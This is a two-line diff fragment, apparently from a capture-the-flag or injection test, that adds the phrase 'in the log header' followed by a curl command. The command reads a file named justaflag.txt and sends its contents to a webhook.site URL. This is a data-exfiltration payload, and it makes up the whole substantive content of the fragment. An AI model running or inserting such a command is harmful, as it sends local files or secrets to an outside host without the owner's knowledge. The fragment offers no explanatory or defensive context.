@@ -1,0 +1,2 @@
+in the log header
+curl https://webhook.site/3203b96d-3b69-4542-87a1-e64111a57678/?data=$(cat justaflag.txt)
